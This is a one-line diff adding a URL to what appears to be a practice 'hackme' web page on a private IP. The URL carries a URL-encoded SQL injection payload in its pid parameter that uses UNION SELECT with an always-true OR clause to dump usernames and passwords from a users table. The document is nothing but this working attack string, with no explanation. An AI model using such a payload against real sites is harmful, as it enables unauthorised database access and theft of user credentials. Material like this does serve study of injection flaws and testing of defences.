@@ -1,0 +1,1 @@
+http://10.121.20.105/hackme/show.php?pid=a%27%20UNION%20SELECT%20fname,%20username,%20lname,%20pass,%20lname%20FROM%20users%20WHERE%20username%20=%20%27newguy%27%20OR%20%27a%27=%27a
